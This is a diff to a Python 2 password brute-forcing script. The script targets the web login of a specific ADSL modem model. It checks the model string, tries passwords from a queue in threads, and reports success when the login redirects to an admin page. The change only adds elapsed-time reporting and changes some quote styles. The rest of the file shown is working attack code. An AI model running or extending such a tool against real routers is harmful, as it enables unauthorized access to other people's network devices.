@@ -6,6 +6,7 @@ import threading
 import Queue
 import os
 import sys
+import timeit
 from requests.exceptions import ConnectionError
 
 if len(sys.argv)== 2:
@@ -16,6 +17,7 @@ else:
 
 queue = Queue.Queue()
 threads = []
+start = timeit.default_timer()
 
 class BruteThread(threading.Thread):
     def __init__(self, queue, tid):
@@ -38,7 +40,10 @@ class BruteThread(threading.Thread):
                 print "\r\033[91m[-] Testing {} Connection Timeout\033[0m".format(dapw)
                 
             if 'rpSys.html' in location:
-                print '\r\033[92mSuccess! Password is: {}\033[0m'.format(dapw)
+                global start
+                stop = timeit.default_timer()
+                print "\r\033[92mSuccess! Password is: {}\033[0m".format(dapw)
+                print "\r\033[92mUsed {} Seconds to complete.\033[0m".format(stop - start)
                 os.kill(os.getpid(), 2)
             else:
                 print "\r\033[91m[-] Attempt failed. TEST: {}, RESULT: {}\033[0m".format(dapw, 'Failed')
@@ -50,7 +55,7 @@ def verify(target):
     except ConnectionError, e:
         print "\r\033[91m[-] Target Modem Down\033[0m"
         sys.exit(2)
-    if 'Modem model: ADSL-RIGER-DB120WL' not in r.text:
+    if "Modem model: ADSL-RIGER-DB120WL" not in r.text:
         print "\r\033[91m[-] Target Modem model not supported.\033[0m"
         sys.exit(2)
 
